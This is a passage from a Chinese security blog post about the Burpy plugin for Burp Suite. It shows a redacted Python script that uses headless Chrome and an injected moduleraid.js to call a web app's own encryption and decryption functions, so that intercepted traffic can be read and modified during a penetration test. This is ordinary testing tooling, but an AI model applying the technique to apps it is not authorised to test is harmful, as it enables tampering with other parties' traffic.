+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment"># 别忘了安装依赖</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">chromeExec = <span class="string">&quot;/usr/bin/chromedriver&quot;</span> <span class="comment"># 需要自己下载chromedriver</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://xxxx.com:58100/xxxx/xxxx&quot;</span> <span class="comment"># 这里就是APP中的Webview当中加载的页面，不过对于一些公司来说，他们通常用一套东西，自己体会</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Burpy</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        this is called from the start of PyRo4 service, so init webdriver here</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        option = webdriver.ChromeOptions()</span><br><span class="line">        option.add_argument(<span class="string">&#x27;headless&#x27;</span>)</span><br><span class="line">        self.driver = webdriver.Chrome(executable_path=chromeExec, chrome_options=option)</span><br><span class="line">        self.driver.implicitly_wait(<span class="number">20</span>)</span><br><span class="line">        self.driver.get(url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            js = self.load_js()</span><br><span class="line">            self.driver.execute_script(js)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Failed to load MouldueRaid JS&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__del__</span>(<span class="params">self</span>):</span><br><span class="line">        self.driver.quit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load_js</span>(<span class="params">self</span>):</span><br><span class="line">        jsFilePath = <span class="string">r&quot;/home/m0nst3r/tools/moduleraid.js&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(jsFilePath) <span class="keyword">as</span> f:</span><br><span class="line">            jsContent = f.read()</span><br><span class="line">        <span class="keyword">return</span> jsContent</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">self, header, body</span>):</span><br><span class="line">        <span class="keyword">return</span> header, body</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, header, body</span>):</span><br><span class="line">        <span class="keyword">if</span> body.startswith(<span class="string">&quot;msg=&quot;</span>):</span><br><span class="line">            data = urllib.unquote(body[<span class="built_in">len</span>(<span class="string">&#x27;msg=&#x27;</span>):])</span><br><span class="line">            DecRes = <span class="string">&quot;&quot;&quot;return window.mR.modules.xxxx.xxxx.decryptData(&#x27;%s&#x27;)&quot;&quot;&quot;</span> % (data)</span><br><span class="line"></span><br><span class="line">            result = self.driver.execute_script(DecRes)</span><br><span class="line">            result = json.dumps(result)</span><br><span class="line">            nbody = <span class="string">&quot;msg=&quot;</span>+result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># the body is the json string</span></span><br><span class="line">            data_json = urllib.unquote(body)</span><br><span class="line">            DecRes = <span class="string">&quot;&quot;&quot;return JSON.stringify(window.mR.modules.xxxx.xxxx.decryptData(&#x27;%s&#x27;))&quot;&quot;&quot;</span> % (data_json)</span><br><span class="line">            result = self.driver.execute_script(DecRes)</span><br><span class="line">            nbody = <span class="string">&quot;msg=&quot;</span>+result</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> header, nbody</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, header, body</span>):</span><br><span class="line">        data = body[<span class="built_in">len</span>(<span class="string">&#x27;msg=&#x27;</span>):]</span><br><span class="line">        data_b64 = b64encode(data)</span><br><span class="line"></span><br><span class="line">        EncRes = <span class="string">&quot;&quot;&quot;return window.mR.modules.xxxx.xxx.encryptData(JSON.parse(atob(&quot;%s&quot;)));&quot;&quot;&quot;</span> % (data_b64)</span><br><span class="line"></span><br><span class="line">        result = self.driver.execute_script(EncRes)</span><br><span class="line">        result_json = json.loads(result)</span><br><span class="line">        result_json[<span class="string">&quot;K3&quot;</span>] = <span class="string">&quot;h5&quot;</span></span><br><span class="line">        result = json.dumps(result_json)</span><br><span class="line">        </span><br><span class="line">        nbody = <span class="string">&#x27;msg=&#x27;</span>+urllib.quote(result)</span><br><span class="line">        <span class="keyword">return</span> header, nbody</span><br></pre></td></tr></table></figure>
+<p>由于考虑这个<code>webdriver</code>的问题，我才把<code>Burpy</code>脚本改成了类的形式。因为webdriver每次启动的时候比较费时，而通过类中的<code>__init__</code>方法，我们可以把这个保持这个类的实例，所以再次调用的时候就不用初始化了。不过，我们点击<code>start server</code>的时候会感觉到一些延迟。</p>
+<p>脱敏之后的这个脚本肯定是运行不了的，但为了演示效果，我原来的文件不能乱改，所以，直接给大家看一下效果就好了：</p>
+<p><img src="/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/webdriver_test.gif"></p>
+<h4 id="Auto-Enc-x2F-Dec"><a href="#Auto-Enc-x2F-Dec" class="headerlink" title="Auto Enc&#x2F;Dec"></a>Auto Enc&#x2F;Dec</h4><p>这个功能是同事提出的意见，花了半天的时间实现了，由此可见我的Java编程功底真的是很浅。。。。</p>
+<p>这个功能可以说是灵魂技能！就好比，，，没想出来，总之很牛逼。</p>
+<p>为啥这么说呢？</p>
+<p>大家发现没有，上面的操作中我每次还需要右键一下，滑动鼠标，瞄准一个菜单，再点击。<br>做为一个懒到极致的人，这些操作都觉得麻烦！于是<code>Auto Enc/Dec</code>来了，只要你写好加密、解密功能，点开这个开关，你直接写明文！<br>对，明文就行了，你点<code>Go</code>的时候，自动调用脚本中的<code>encrypt</code>函数进行加密，拿到服务器返回数据之后，自动调用脚本中的<code>decrypt</code>函数解密！</p>
+<p>同学，还有比这更美的吗？</p>
+<p>来体验加证明一下，为了简单，我就用Base64测试的那个脚本吧。</p>
+<p><img src="/burpsuite/%E6%89%93%E9%80%9ABurpSuite%E4%B8%8EPython%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%89/auto.gif"></p>
+<p>大家可以通过wireshark看到，其实这块的实现还有bug。<br>不过，我应该会很快补上的，恩，不会很久的。</p>
+<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>如果这个长文你都看完了，欢迎到Github上赏Star，欢迎提出改进建议，更欢迎contribution。</p>
+<p>么么哒！</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/mr-m0nst3r/Burpy">https://github.com/mr-m0nst3r/Burpy</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/burpsuite/" rel="tag"># burpsuite</a>
+              <a href="/tags/burpy/" rel="tag"># burpy</a>
+              <a href="/tags/python/" rel="tag"># python</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/pentest/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%AE%B0%E5%BD%95.html" rel="prev" title="无线安全检查记录">
+                  <i class="fa fa-chevron-left"></i> 无线安全检查记录
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/pentest/%E9%AB%98%E6%95%88%E5%A4%84%E7%90%86H5%E7%AB%99%E7%82%B9%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86.html" rel="next" title="高效处理H5站点流量加解密">
+                  高效处理H5站点流量加解密 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">m0nst3r</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
